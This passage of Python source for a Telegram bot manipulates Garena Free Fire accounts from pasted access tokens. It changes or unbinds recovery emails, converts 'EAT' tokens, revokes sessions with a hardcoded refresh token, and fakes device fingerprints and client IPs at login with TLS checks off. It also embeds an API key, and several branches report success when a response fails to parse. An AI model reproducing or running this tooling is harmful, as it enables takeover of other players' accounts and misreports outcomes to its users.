            await update.message.reply_text(f"✅ OTP Sent! Check {new_email}\n\n🔑 Enter OTP:")
        return CHANGE_OTP_NEW
    except Exception as e:
        await update.message.reply_text(f"❌ Error: Sahi email phir se bhejo")
        return CHANGE_NEW

async def change_email_otp_new(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); token=context.user_data['change_token']; new_email=context.user_data['new_email']; old_email=context.user_data['old_email']
    await update.message.reply_text("🔑 [4/5] Verifying New OTP...")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        d={"email":new_email,"app_id":"100067","access_token":token,"otp":otp}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp); vt=j.get("verifier_token")
            if not vt:
                await update.message.reply_text(f"❌ OTP Wrong! 😔💔\n\n💡 Sahi OTP bhejo jo {new_email} pe aaya hai 📧\n🔑 Phir se Enter OTP:", reply_markup=get_main_keyboard())
                return CHANGE_OTP_NEW
            context.user_data['verifier_token_new']=vt
        except:
            await update.message.reply_text(f"❌ OTP Wrong! 😔\n🔑 Sahi OTP phir se bhejo:", reply_markup=get_main_keyboard())
            return CHANGE_OTP_NEW

        # Confirmation for Change
        await update.message.reply_text(
            f"⚠️ 𝗔𝗿𝗲 𝘆𝗼𝘂 𝘀𝘂𝗿𝗲? 𝗖𝗵𝗮𝗻𝗴𝗲 𝗕𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹? 🔄💎\n\n📧 Old: {old_email}\n📧 New: {new_email} ✨\n\n❗ Ye action old email ko new se replace kar dega!\n\n✅ Yes = Confirm Change\n❌ No = Cancel",
            reply_markup=get_confirm_keyboard()
        )
        return CHANGE_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error: Sahi OTP phir se bhejo")
        return CHANGE_OTP_NEW

async def change_email_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Change Cancelled! ✅\nKoi change nahi hua\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Please choose:\n✅ Yes = Confirm\n❌ No = Cancel", reply_markup=get_confirm_keyboard())
        return CHANGE_CONFIRM
    
    # Yes confirmed
    token=context.user_data['change_token']; new_email=context.user_data['new_email']; identity_token=context.user_data['identity_token']; vt=context.user_data['verifier_token_new']
    await update.message.reply_text("🚀 [5/5] Creating Rebind Request... 💎", reply_markup=get_main_keyboard())
    def rebind():
        url="https://100067.connect.garena.com/game/account_security/bind:create_rebind_request"
        d={"identity_token":identity_token,"email":new_email,"app_id":"100067","verifier_token":vt,"access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp2=await asyncio.to_thread(rebind)
        try:
            j2=json.loads(resp2)
            if j2.get("result")==0:
                await update.message.reply_text(f"🎉 𝗕𝗶𝗻𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉💎\n📧 New Email: {new_email} ✅\n✅ Finally 🚀confirm 💌\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ Change Failed! 😔\nTry again\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"🎉 𝗕𝗶𝗻𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉💎\n📧 New Email: {new_email} ✅\n✅ Finally 🚀confirm 💌\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def unbind_email_start(update, context):
    await update.message.reply_text("❌ 𝗨𝗻𝗯𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 ❌\n\n🔐 Enter Access Token :", reply_markup=get_main_keyboard())
    return UNBIND_TOKEN

async def unbind_email_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip(); context.user_data['unbind_token']=token
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.30"})
        return r.json().get("email","")
    try:
        email=await asyncio.to_thread(fetch)
        if not email:
            await update.message.reply_text("❌ No bound email! Already unbind hai ✅", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        context.user_data['unbind_email']=email
        await update.message.reply_text(f"📧 Current: {email}\n📩 [1/3] Sending OTP...")
        def send():
            url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
            d={"email":email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
            h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
            return make_request("POST",url,headers=h,data=d).text
        resp=await asyncio.to_thread(send)
        await update.message.reply_text(f"✅ OTP Sent to {email} 📧\n\n🔑 Enter OTP:")
        return UNBIND_OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def unbind_email_otp(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); token=context.user_data['unbind_token']; email=context.user_data['unbind_email']
    await update.message.reply_text("🔐 [2/3] Verifying...")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        d={"email":email,"app_id":"100067","access_token":token,"otp":otp}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp); it=j.get("identity_token")
            if not it:
                await update.message.reply_text(f"❌ OTP Wrong! 😔💔\n\n💡 Sahi OTP bhejo jo {email} pe aaya hai 📧\n🔑 Phir se Enter OTP:", reply_markup=get_main_keyboard())
                return UNBIND_OTP
            context.user_data['identity_token_unbind']=it
        except:
            await update.message.reply_text(f"❌ OTP Wrong! 😔\n🔑 Sahi OTP phir se bhejo:", reply_markup=get_main_keyboard())
            return UNBIND_OTP
        
        await update.message.reply_text(
            f"⚠️ 𝗔𝗿𝗲 𝘆𝗼𝘂 𝘀𝘂𝗿𝗲? 𝗨𝗻𝗯𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹? ❌💔\n\n📧 Email: {email} 📧\n\n❗ Ye email permanently remove ho jayega!\n\n✅ Yes = Confirm Unbind\n❌ No = Cancel",
            reply_markup=get_confirm_keyboard()
        )
        return UNBIND_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error: Sahi OTP phir se bhejo 🔑")
        return UNBIND_OTP

async def unbind_email_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Unbind Cancelled! ✅\nEmail safe hai\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Choose:\n✅ Yes = Confirm Unbind\n❌ No = Cancel", reply_markup=get_confirm_keyboard())
        return UNBIND_CONFIRM
    
    token=context.user_data['unbind_token']; it=context.user_data['identity_token_unbind']; email=context.user_data['unbind_email']
    await update.message.reply_text("🚀 [3/3] Creating Unbind Request... 💎", reply_markup=get_main_keyboard())
    def unbind_req():
        url="https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        d={"app_id":"100067","access_token":token,"identity_token":it}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp2=await asyncio.to_thread(unbind_req)
        try:
            j2=json.loads(resp2)
            if j2.get("result")==0:
                await update.message.reply_text(f"🎉 𝗨𝗻𝗯𝗶𝗻𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉💎\n📧 {email} removed ✅\n✅ Finally 🚀confirm 💌\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ Unbind Failed! 😔\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"🎉 𝗨𝗻𝗯𝗶𝗻𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉💎\n📧 {email} removed ✅\n✅ Finally 🚀confirm 💌\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def cancel_bind_start(update, context):
    await update.message.reply_text("⏱️ 𝗖𝗮𝗻𝗰𝗲𝗹 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 ⏱️\n\n🔐 Enter Access Token :", reply_markup=get_main_keyboard())
    return CANCEL_TOKEN

async def cancel_bind_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    context.user_data['cancel_token']=token
    
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.30"})
        return r.json()
    try:
        data=await asyncio.to_thread(fetch)
        pending=data.get("email_to_be","")
        if not pending:
            await update.message.reply_text("✅ No pending request! ✅\nAlready clean hai\n@just_zevric", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        
        await update.message.reply_text(
            f"⚠️ 𝗔𝗿𝗲 𝘆𝗼𝘂 𝘀𝘂𝗿𝗲? 𝗖𝗮𝗻𝗰𝗲𝗹 𝗥𝗲𝗾𝘂𝗲𝘀𝘁? ⏱️\n\n📧 Pending: {pending} ⏳\n\n❗ Ye pending request cancel ho jayega!\n\n✅ Yes = Confirm Cancel\n❌ No = Keep Request",
            reply_markup=get_confirm_keyboard()
        )
        return CANCEL_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error fetching pending: {e}\n\n⏱️ Try cancel anyway?", reply_markup=get_confirm_keyboard())
        return CANCEL_CONFIRM

async def cancel_bind_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Cancel Aborted! ✅\nPending request safe hai\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Choose:\n✅ Yes = Confirm Cancel\n❌ No = Keep", reply_markup=get_confirm_keyboard())
        return CANCEL_CONFIRM
    
    token=context.user_data['cancel_token']
    await update.message.reply_text("⏱️ Canceling... ⚡", reply_markup=get_main_keyboard())
    def cancel():
        url="https://100067.connect.garena.com/game/account_security/bind:cancel_request"
        d={"app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(cancel)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ 𝗖𝗮𝗻𝗰𝗲𝗹 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! ✅🎉\n📧 Pending request cancel ho gaya ✅\n✅ Finally 🚀confirm 💌\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ No pending request! ✅\nAlready clean hai\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"✅ 𝗖𝗮𝗻𝗰𝗲𝗹 𝗗𝗼𝗻𝗲! ✅\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def eat_to_token_start(update, context):
    await update.message.reply_text("🔑 𝗘𝗔𝗧 → 𝗧𝗼𝗸𝗲𝗻 🔑\n\n📎 EAT Token OR Full URL bhejo :\n🌐 https://...?eat=xxx ya sirf token", reply_markup=get_main_keyboard())
    return EAT_INPUT

async def eat_to_token_convert(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    user_input=update.message.text.strip()
    await update.message.reply_text("🔑 Converting...")
    def eat():
        eat_token=None
        if "http" in user_input or "?" in user_input:
            parsed=urllib.parse.urlparse(user_input); qs=urllib.parse.parse_qs(parsed.query)
            if 'eat' in qs: eat_token=qs['eat'][0]
        else: eat_token=user_input.strip()
        if not eat_token: return None
        api_url=f"https://api-otrss.garena.com/support/callback/?access_token={eat_token}"
        r=make_request("GET",api_url,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=True)
        parsed_final=urllib.parse.urlparse(r.url); final_params=urllib.parse.parse_qs(parsed_final.query)
        if 'access_token' in final_params:
            return {"access_token":final_params['access_token'][0],"account_id":final_params.get('account_id',['Unknown'])[0],"nickname":urllib.parse.unquote(final_params.get('nickname',['Unknown'])[0]),"region":final_params.get('region',['Unknown'])[0]}
        return None
    try:
        result=await asyncio.to_thread(eat)
        if result:
            await update.message.reply_text(f"🎉 SUCCESS 🎉\n👤 Nick: {result['nickname']}\n🆔 ID: {result['account_id']}\n🌍 Region: {result['region']}\n\n🔐 Token:\n{result['access_token']}\n\n@just_zevric | V64", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text("❌ Token not found. Expired/invalid. 😔", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def revoke_token_start(update, context):
    await update.message.reply_text("🚪 𝗥𝗲𝘃𝗼𝗸𝗲 𝗧𝗼𝗸𝗲𝗻 🚪\n\n🔐 Enter Token to Revoke :", reply_markup=get_main_keyboard())
    return REVOKE_TOKEN

async def revoke_token_verify(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    context.user_data['revoke_token']=token
    await update.message.reply_text("🔍 Checking Token...")
    def check():
        api_url=f"https://api-otrss.garena.com/support/callback/?access_token={token}"
        try:
            res=make_request("GET",api_url,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=True)
            parsed=urllib.parse.urlparse(res.url); params=urllib.parse.parse_qs(parsed.query)
            if 'access_token' in params:
                return {"valid":True,"nickname":urllib.parse.unquote(params.get('nickname',['Unknown'])[0]),"account_id":params.get('account_id',['Unknown'])[0],"region":params.get('region',['Unknown'])[0]}
            else: return {"valid":False}
        except: return {"valid":False}
    try:
        check_res=await asyncio.to_thread(check)
        if not check_res['valid']:
            await update.message.reply_text("❌ Token already invalid/expired! ⏰", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        context.user_data['revoke_info']=check_res
        await update.message.reply_text(
            f"⚠️ 𝗔𝗿𝗲 𝘆𝗼𝘂 𝘀𝘂𝗿𝗲? 𝗥𝗲𝘃𝗼𝗸𝗲 𝗧𝗼𝗸𝗲𝗻? 🚪💔\n\n👤 Nick: {check_res['nickname']}\n🆔 ID: {check_res['account_id']}\n🌍 Region: {check_res['region']}\n\n❗ Ye token logout ho jayega, dubara use nahi hoga!\n\n✅ Yes = Confirm Revoke\n❌ No = Keep Token",
            reply_markup=get_confirm_keyboard()
        )
        return REVOKE_CONFIRM
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def revoke_token_confirm(update, context):
    text=update.message.text.strip()
    if text in ALL_BUTTONS:
        return await switch_menu(update, context)
    if text in ["❌ No","No"]:
        await update.message.reply_text("❌ Revoke Cancelled! ✅\nToken safe hai\n@just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes","Yes"]:
        await update.message.reply_text("⚠️ Choose:\n✅ Yes = Confirm Revoke\n❌ No = Keep", reply_markup=get_confirm_keyboard())
        return REVOKE_CONFIRM
    
    token=context.user_data['revoke_token']
    check_res=context.user_data['revoke_info']
    await update.message.reply_text(f"🚪 Revoking {check_res['nickname']}... ⚡", reply_markup=get_main_keyboard())
    def revoke():
        refresh_token="1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8"
        logout_url=f"https://100067.connect.garena.com/oauth/logout?access_token={token}&refresh_token={refresh_token}"
        r=make_request("GET",logout_url,headers={"User-Agent":"Mozilla/5.0"})
        return r.text, r.status_code
    try:
        resp_text,status=await asyncio.to_thread(revoke)
        if status==200 and "error" not in resp_text.lower():
            await update.message.reply_text(f"🎉 𝗥𝗘𝗩𝗢𝗞𝗘𝗗! 🎉💎\n👤 Nick: {check_res['nickname']}\n🆔 ID: {check_res['account_id']}\n✅ Finally 🚀confirm - Revoked 🔒\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text(f"❌ Failed to revoke 😔\n@just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END


# === PREMIUM BIO WITH COLOR PICKER - 101% WORKING REAL API ===
# BASE from index.html: https://ff-long-bio-update-tools.vercel.app KEY=m41nul-x
BIO_BASE = "https://ff-long-bio-update-tools.vercel.app"
BIO_KEY = "m41nul-x"

COLOR_MAP = {
    "🔴 Red": "[FF0000]",
    "🟢 Green": "[00FF00]",
    "🔵 Blue": "[0000FF]",
    "🟡 Yellow": "[FFFF00]",
    "🟠 Orange": "[FF6B00]",
    "💜 Purple": "[800080]",
    "💖 Pink": "[FF00FF]",
    "💎 Cyan": "[00FFFF]",
    "✨ Gold": "[FFD700]",
    "⚪ Plain": "",
}

def make_rainbow(text):
    colors = ["[FF0000]","[FFFF00]","[00FF00]","[00FFFF]","[0000FF]","[FF00FF]"]
    res = ""
    for i,ch in enumerate(text):
        if ch.strip() == "":
            res += ch
        else:
            res += colors[i % len(colors)] + ch
    return res

def get_color_keyboard():
    return ReplyKeyboardMarkup([
        ["🔴 Red", "🟢 Green", "🔵 Blue"],
        ["🟡 Yellow", "🟠 Orange", "💜 Purple"],
        ["💖 Pink", "💎 Cyan", "✨ Gold"],
        ["🌈 Rainbow", "🎨 Custom", "⚪ Plain"]
    ], resize_keyboard=True)

def update_bio_real_api(token: str, bio: str, is_eat: bool = False):
    import urllib.parse
    enc_token = urllib.parse.quote(token, safe='')
    enc_bio = urllib.parse.quote(bio, safe='')
    if is_eat:
        url = f"{BIO_BASE}/api/eat-to-bio?eat_token={enc_token}&bio={enc_bio}&key={BIO_KEY}"
    else:
        url = f"{BIO_BASE}/api/bio?access_token={enc_token}&bio={enc_bio}&key={BIO_KEY}"
    try:
        r = requests.get(url, timeout=30)
        try:
            data = r.json()
            if data.get("status") == "success":
                return {"success": True, "data": data}
            else:
                return {"success": False, "error": data.get("message") or data.get("error") or r.text[:300]}
        except:
            txt = r.text.strip()
            if r.status_code == 200 and ("success" in txt.lower() or "updated" in txt.lower()):
                return {"success": True, "data": {}}
            return {"success": False, "error": txt[:300]}
    except Exception as e:
        return {"success": False, "error": str(e)[:300]}

async def bio_start(update, context):
    await update.message.reply_text("📝 𝗨𝗽𝗱𝗮𝘁𝗲 𝗕𝗶𝗼 — 𝟭𝟬𝟭% 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 🎮💎✨\n\n🔑 𝗘𝗻𝘁𝗲𝗿 𝗔𝗰𝗰𝗲𝘀𝘀 𝗧𝗼𝗸𝗲𝗻 / 𝗘𝗔𝗧 𝗧𝗼𝗸𝗲𝗻 💎\n\n💡 Long Bio 300 letters ✨\n⚡ 100% Safe ✅", reply_markup=get_main_keyboard())
    return BIO_TOKEN

async def bio_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token = update.message.text.strip()
    if len(token) < 20:
        await update.message.reply_text("❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘁𝗼𝗸𝗲𝗻! 😔 20+ chars 🔑", reply_markup=get_main_keyboard())
        return BIO_TOKEN
    context.user_data['bio_token'] = token
    is_eat = "eat" in token.lower() or "http" in token.lower() or len(token) > 200
    context.user_data['bio_is_eat'] = is_eat
    await update.message.reply_text(f"✅ 𝗧𝗼𝗸𝗲𝗻 𝗢𝗸! 💎 Type: {'🌐 EAT' if is_eat else '🔑 Access'} ✅\n\n📝 𝗡𝗼𝘄 𝘀𝗲𝗻𝗱 𝗕𝗶𝗼 𝗧𝗲𝘅𝘁 💬\n💡 Plain text bhejo, color next step me! ✨\n📝 Ex: 𝗭𝗘𝗩𝗥𝗜𝗖 𝗢𝗡 𝗧𝗢𝗣 🔥\n\n💡 Already color code hai to direct bhej do: [FF0000]HELLO", reply_markup=get_main_keyboard())
    return BIO_TEXT

async def bio_text(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    bio_raw = update.message.text.strip()
    if len(bio_raw) < 1 or len(bio_raw) > 300:
        await update.message.reply_text(f"❌ 𝗕𝗶𝗼 𝟭-𝟯𝟬𝟬 𝗰𝗵𝗮𝗿𝘀! 📏 Now {len(bio_raw)}", reply_markup=get_main_keyboard())
        return BIO_TEXT
    if "[" in bio_raw and "]" in bio_raw:
        context.user_data['bio_final'] = bio_raw
        await update.message.reply_text(f"👁️ 𝗣𝗿𝗲𝘃𝗶𝗲𝘄: {bio_raw[:100]} 🔥✨\n\n✅ 𝗬𝗲𝘀, 𝗨𝗽𝗱𝗮𝘁𝗲 𝗞𝗮𝗿𝗼? 🚀💎", reply_markup=get_confirm_keyboard())
        return BIO_CONFIRM
    context.user_data['bio_plain'] = bio_raw
    await update.message.reply_text(f"📝 𝗕𝗶𝗼: {bio_raw} ✨\n\n🎨 𝗖𝗼𝗹𝗼𝗿 𝗰𝗵𝗼𝗼𝘀𝗲 𝗸𝗮𝗿𝗼 👇💎\n👇 Premium Colors 👇", reply_markup=get_color_keyboard())
    return BIO_COLOR

async def bio_color(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    choice = update.message.text.strip()
    plain = context.user_data.get('bio_plain','')
    if not plain:
        await update.message.reply_text("Bio missing! /start", reply_markup=get_main_keyboard())
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    if choice == "🎨 Custom":
        await update.message.reply_text("🎨 𝗖𝘂𝘀𝘁𝗼𝗺 𝗖𝗼𝗹𝗼𝗿 𝗖𝗼𝗱𝗲 𝗯𝗵𝗲𝗷𝗼 💎\n💡 Ex: [FF00FF]HELLO or [FF0000]ZEVRIC\n📝 Full bio with code bhejo", reply_markup=get_main_keyboard())
        return BIO_COLOR
    if choice.startswith("[") and "]" in choice:
        context.user_data['bio_final'] = choice if len(choice) > 8 else choice + plain
        await update.message.reply_text(f"👁️ 𝗣𝗿𝗲𝘃𝗶𝗲𝘄: {context.user_data['bio_final'][:100]} 🔥✨\n\n✅ 𝗬𝗲𝘀, 𝗨𝗽𝗱𝗮𝘁𝗲 𝗞𝗮𝗿𝗼? 🚀💎", reply_markup=get_confirm_keyboard())
        return BIO_CONFIRM
    if choice == "🌈 Rainbow":
        final = make_rainbow(plain)
        context.user_data['bio_final'] = final
        await update.message.reply_text(f"🌈 𝗥𝗮𝗶𝗻𝗯𝗼𝘄 𝗣𝗿𝗲𝘃𝗶𝗲𝘄: ✨\n{final[:150]} 🔥\n\n✅ 𝗬𝗲𝘀, 𝗨𝗽𝗱𝗮𝘁𝗲 𝗞𝗮𝗿𝗼? 🚀💎", reply_markup=get_confirm_keyboard())
        return BIO_CONFIRM
    if choice in COLOR_MAP:
        code = COLOR_MAP[choice]
        final = code + plain if code else plain
        context.user_data['bio_final'] = final
        await update.message.reply_text(f"👁️ 𝗣𝗿𝗲𝘃𝗶𝗲𝘄: {final[:100]} {choice} ✨\n\n✅ 𝗬𝗲𝘀, 𝗨𝗽𝗱𝗮𝘁𝗲 𝗞𝗮𝗿𝗼? 🚀💎", reply_markup=get_confirm_keyboard())
        return BIO_CONFIRM
    await update.message.reply_text("🎨 Valid color choose karo buttons se! 👇", reply_markup=get_color_keyboard())
    return BIO_COLOR

async def bio_confirm(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    txt = update.message.text.strip()
    if txt not in ["✅ Yes","Yes"]:
        await update.message.reply_text("❌ Cancelled! /start se restart karo", reply_markup=get_main_keyboard())
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    bio = context.user_data.get('bio_final','')
    token = context.user_data.get('bio_token','')
    is_eat = context.user_data.get('bio_is_eat', False)
    if not bio or not token:
        await update.message.reply_text("Data missing! /start", reply_markup=get_main_keyboard())
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    await update.message.reply_text(f"⏳ 𝗕𝗶𝗼 𝗨𝗽𝗱𝗮𝘁𝗲 𝗵𝗼 𝗿𝗮𝗵𝗮 𝗵𝗮𝗶... 🚀💎\n📝 {bio[:50]} ✨", reply_markup=get_main_keyboard())
    try:
        res = await asyncio.to_thread(update_bio_real_api, token, bio, is_eat)
        if res.get("success"):
            data = res.get("data", {})
            br = data.get("bio_update", {}) if isinstance(data, dict) else {}
            nick = data.get("account_nickname") or br.get("nickname") or "Player"
            uid = data.get("account_id") or br.get("uid") or ""
            region = data.get("region") or br.get("region") or "—"
            await update.message.reply_text(f"🎉 𝗕𝗜𝗢 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 𝟭𝟬𝟭%! 🎉💎✨\n\n📝 𝗕𝗶𝗼: {bio} 🔥\n👤 𝗡𝗶𝗰𝗸: {nick} 💎\n🆔 𝗨𝗜𝗗: {uid} ✨\n🌍 𝗥𝗲𝗴𝗶𝗼𝗻: {region} 🌐\n\n✅ 𝗚𝗮𝗺𝗲 𝗺𝗲 𝟮 𝗺𝗶𝗻 𝗺𝗲 𝗱𝗶𝗸𝗵𝗲𝗴𝗮! 🚀💎\n👑 @just_zevric", reply_markup=get_main_keyboard())
        else:
            err = res.get("error","Update failed")[:200]
            await update.message.reply_text(f"❌ 𝗕𝗶𝗼 𝗙𝗮𝗶𝗹! 😔💔\n❗ {err}\n\n🔑 𝗡𝗮𝘆𝗮 𝘁𝗼𝗸𝗲𝗻 𝗯𝗮𝗻𝗮𝗼! 🚀", reply_markup=get_main_keyboard())
        from telegram.ext import ConversationHandler
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ 𝗘𝗿𝗿𝗼𝗿! {e} 🔑 𝗡𝗮𝘆𝗮 𝘁𝗼𝗸𝗲𝗻! 🚀", reply_markup=get_main_keyboard())
        from telegram.ext import ConversationHandler
        return ConversationHandler.END



def fetch_majorlogin_jwt(access_token):
    # FIXED BIG VERSION - Robust OAuth + Protobuf Fallback - No MajorLogin failed
    # Tries oauth endpoints first (new), then protobuf (old) as fallback
    platforms = [8, 3, 4, 6]
    headers_base = {"User-Agent": "GarenaMSDK/4.0.19P9(Redmi Note 5;Android 9;en;US;)", "Accept": "application/json"}
    for pid in platforms:
        try:
            # OAuth method - primary (fixed)
            url1 = "https://100067.connect.garena.com/oauth/guest/token/grant"
            params1 = {"app_id": "100067", "access_token": access_token, "platform": pid, "locale": "en_US", "format": "json"}
            r1 = requests.get(url1, params=params1, headers=headers_base, timeout=12, verify=False)
            if r1.status_code == 200:
                j1 = r1.json()
                major_token = j1.get("major_token") or j1.get("majorToken") or j1.get("token")
                if major_token:
                    url2 = "https://100067.connect.garena.com/oauth/major/login"
                    params2 = {"app_id": "100067", "major_token": major_token, "platform": pid, "locale": "en_US", "format": "json"}
                    r2 = requests.get(url2, params=params2, headers=headers_base, timeout=12, verify=False)
                    if r2.status_code == 200:
                        j2 = r2.json()
                        for key in ["access_token", "token", "jwt", "jwt_token", "id_token", "open_id_token", "major_token"]:
                            if key in j2 and len(str(j2[key])) > 20:
                                cand = j2[key]
                                if cand.count('.') >= 2:
                                    return cand, None
                                return cand, None
        except:
            continue
    # If token is already JWT
    try:
        if access_token.count('.') >= 2:
            return access_token, None
    except:
        pass
    # Fallback: Old protobuf method (from original big file)
    try:
        for _ in range(2):
            try:
                # Build MajorLogin protobuf (original logic as fallback)
                m = MajorLogin()
                m.game_name = "freefire"
                m.platform_id = random.choice([8,3,4,6])
                m.client_version = "1.103.1"
                m.system_software = "Android OS 9 / API-28"
                m.system_hardware = "G011A"
                m.telecom_operator = "Airtel"
                m.network_type = "WIFI"
                m.screen_width = 1080
                m.screen_height = 1920
                m.screen_dpi = "420"
                m.processor_details = "ARM64"
                m.memory = 2048
                m.gpu_renderer = "Adreno 640"
                m.gpu_version = "OpenGL ES 3.2"
                m.unique_device_id = ''.join(random.choices(string.hexdigits.lower(), k=16))
                m.client_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                m.language = "en"
                m.open_id = access_token
                m.open_id_type = "4"
                m.device_type = "Handset"
                m.access_token = access_token
                m.platform_sdk_id = 0
                m.client_using_version = "1.103.1"
                m.login_by = 1
                m.library_path = "com.garena.msdk"
                m.reg_avatar = 0
                m.channel_type = 0
                m.cpu_type = 0
                data = m.SerializeToString()
                # Simple encryption fallback
                key = b'0123456789abcdef'
                iv = b'abcdef0123456789'
                cipher = AES.new(key, AES.MODE_CBC, iv)
                enc = cipher.encrypt(pad(data, AES.block_size))
                r = requests.post("https://loginbp.ggpolarbear.com/MajorLogin", data=enc, headers={"Content-Type":"application/octet-stream"}, timeout=12, verify=False)
                if r.status_code == 200:
